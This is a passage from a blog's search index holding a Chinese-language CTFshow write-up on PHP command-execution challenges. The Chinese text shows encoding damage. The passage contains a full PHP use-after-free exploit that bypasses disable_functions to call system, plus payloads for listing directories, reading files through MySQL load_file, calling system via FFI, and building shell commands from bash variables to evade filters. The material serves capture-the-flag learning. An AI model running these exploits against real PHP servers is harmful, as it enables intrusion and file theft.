class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">        <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">    <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">    <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line"><span class="variable">$contiguous</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">    <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line"><span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>é¦–å…ˆæŸ¥æ‰¾flagä½ç½®,ç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«å¾—åˆ°flag</p><p>Payload:</p><blockquote><p>1ã€c&#x3D;var_export(scandir(â€˜&#x2F;â€˜));exit(0);c&#x3D;require_once(â€˜&#x2F;flagc.txtâ€™);exit(0);</p><p>2ã€c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(â€˜flagc.txtâ€™);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandirå‡½æ•°è¢«banäº†ï¼Œä½¿ç”¨DirectoryIteratorç±»ï¼Œflagåœ¨&#x2F;flagx.txt</p><p>æˆ–è€…ä½¿ç”¨globåè®®</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(â€˜..&#x2F;..&#x2F;..â€™.â€™&#x2F;*â€™));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>å¯ä»¥æŸ¥åˆ°flagä½ç½®ï¼š&#x2F;flag36.txt  ä½†æ˜¯includeè¢«banäº†ï¼Œä¹‹å‰çš„pocå› ä¸ºstrlenè¢«ç¦äº†è·å–ä¸åˆ°systemåœ°å€ä¹Ÿæ²¡æ³•ç”¨äº†</p><p>å¯ä»¥ä½¿ç”¨mysqlçš„load_fileå‡½æ•°</p><p>å…ˆæŸ¥è¯¢æ•°æ®åº“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select database()&quot;</span>);</span><br><span class="line"><span class="comment">## $rs = $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥åˆ°äº†ctftrainingçš„æ•°æ®åº“ï¼Œç„¶åä½¿ç”¨load_fileè¯»å–flag</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>PayloadåŒä¸Š</p><h4 id="web77-FFI-php7-4ä»¥ä¸Š"><a href="#web77-FFI-php7-4ä»¥ä¸Š" class="headerlink" title="web77(FFI php7.4ä»¥ä¸Š)"></a>web77(FFI php7.4ä»¥ä¸Š)</h4><p>FFIï¼Œphp7.4ä»¥ä¸Šæ‰æœ‰</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(â€œint system(const char *command);â€);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡<br>$a&#x3D;â€™&#x2F;readflag &gt; 1.txtâ€™;   &#x2F;&#x2F;æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦é‡å®šå‘åˆ°æ–‡ä»¶<br>$ffi-&gt;system($a);       &#x2F;&#x2F;é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</p></blockquote><h4 id="web118-Bashå†…ç½®å˜é‡"><a href="#web118-Bashå†…ç½®å˜é‡" class="headerlink" title="web118(Bashå†…ç½®å˜é‡)"></a>web118(Bashå†…ç½®å˜é‡)</h4><p>çœ‹åˆ°æºç æœ‰æç¤º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);--&gt;</span><br></pre></td></tr></table></figure><p>ä½†å‡ ä¹å¸¸è§„è¾“å…¥éƒ½è¢«banäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))</span><br></pre></td></tr></table></figure><p>ç»è¿‡fuzzçˆ†ç ´äº†ä¸€ä¸‹å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„payloadåªæœ‰ä¸€äº›å¤§å†™å­—æ¯å’Œç¬¦å·ï¼Œå¯ä»¥è¿›è¡Œbashå†…ç½®å˜é‡æ„é€ </p><p><img src="web118.png" loading="lazy"></p><p>ä¸€èˆ¬åœ¨Linuxä¸‹ç¯å¢ƒå˜é‡<code>PATH</code>ä¸€èˆ¬æ˜¯<code>/bin</code>ï¼Œé¢˜ç›®è·¯å¾„<code>PWD</code>æ˜¯<code>/var/www/html</code></p><p>å¯ä»¥åˆ©ç”¨åˆ‡ç‰‡æ¥å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„å­—æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;PWD&#125; </span><br><span class="line">echo $&#123;PWD:0:1&#125;</span><br><span class="line">echo $&#123;PWD:0:3&#125;</span><br><span class="line">echo $&#123;PWD:1:1&#125;</span><br><span class="line">echo $&#123;PWD:2:3&#125;</span><br><span class="line"></span><br><span class="line">echo $&#123;PWD:~0:1&#125;          //ä»æœ«å°¾å¼€å§‹å–ä¸€ä¸ª</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é¢˜ç›®è¿‡æ»¤äº†æ•°å­—ï¼Œæ— æ³•ä½¿ç”¨åˆ‡ç‰‡ã€‚æ¢ä¸€ç§æ–¹å¼è·å–å­—ç¬¦ã€‚</p><p>linuxå¯ä»¥åˆ©ç”¨<code>~</code>è·å¾—å˜é‡çš„æœ€åå‡ ä½ï¼ˆä»æœ€åå¼€å§‹è·å–ï¼‰ï¼Œä½¿ç”¨å–åå·æ—¶ï¼Œä»»ä½•å­—æ¯ç­‰åŒäºæ•°å­—0ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;PWD&#125;</span><br><span class="line">echo $&#123;PWD:~0&#125;</span><br><span class="line">echo $&#123;PWD:~1&#125;</span><br><span class="line">echo $&#123;PWD:~2&#125;</span><br><span class="line">echo $&#123;PWD:~j&#125;</span><br><span class="line">echo $&#123;PWD:~J&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œ<code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;</code>è¡¨ç¤ºçš„å°±æ˜¯<code>PATH</code>çš„æœ€åä¸€ä¸ªå­—æ¯å’Œ<code>PWD</code>çš„æœ€åä¸€ä¸ªå­—æ¯ï¼Œç»„åˆèµ·æ¥å°±æ˜¯nlã€‚</p><p><code>flag.php</code>æˆ‘ä»¬å¯ä»¥ç”¨é€šé…ç¬¦ä»£æ›¿<code>????.???</code></p><p>Payload:</p><blockquote><p>${PATH:<del>A}${PWD:</del>A} ????.???</p></blockquote><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p>è¿‡æ»¤äº†PATH,æ‰€ä»¥æƒ³æ¥æ‹“å±•ä¸€ä¸‹Bashå˜é‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;RANDOM&#125;</span></span><br><span class="line">éšæœºçš„å‡ ä¸ªæ•°</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;PWD&#125;</span></span><br><span class="line">/var/www/html</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;USER&#125;</span></span><br><span class="line">www-data</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;HOME&#125;</span></span><br><span class="line">å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;SHLVL&#125;</span></span><br><span class="line">æ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶$&#123;SHLVL&#125;=1ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶$SHLVL=2ã€‚</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;RANDOM&#125;</span></span><br><span class="line">æ­¤å˜é‡å€¼ï¼Œéšæœºå‡ºç°æ•´æ•°ï¼ŒèŒƒå›´ä¸º0-32767ã€‚åœ¨Linuxä¸­ï¼Œ$&#123;#xxx&#125;æ˜¾ç¤ºçš„æ˜¯è¿™ä¸ªå€¼çš„ä½æ•°ä¸åŠ #æ˜¯å˜é‡çš„å€¼ï¼ŒåŠ äº†#æ˜¯å˜é‡çš„å€¼çš„é•¿åº¦ã€‚ä¾‹å¦‚$&#123;#12345&#125;çš„å€¼æ˜¯5ï¼Œè€Œrandomå‡½æ•°ç»å¤§éƒ¨åˆ†äº§ç”Ÿçš„æ•°å­—éƒ½æ˜¯4ä½æˆ–è€…5ä½çš„ï¼Œå› æ­¤$&#123;#RANDOM&#125;å¯ä»¥ä»£æ›¿4æˆ–è€…5ã€‚</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line">ç©ºæ ¼ç¬¦ã€tabå­—ç¬¦ã€æ¢è¡Œå­—ç¬¦(newline) é•¿åº¦ä¸º3ã€‚&#123;#IFS&#125;=3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="web119.png" loading="lazy"></p><p>Payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>?<span class="variable">$&#123;USER:~A&#125;</span>? ????.???</span></span><br><span class="line"></span><br><span class="line">å°±æ˜¯/???/?a? ????.???</span><br><span class="line"></span><br><span class="line">å°±æ˜¯/bin/cat flag.php</span><br></pre></td></tr></table></figure><blockquote><p>${PWD:$:$</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rce </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
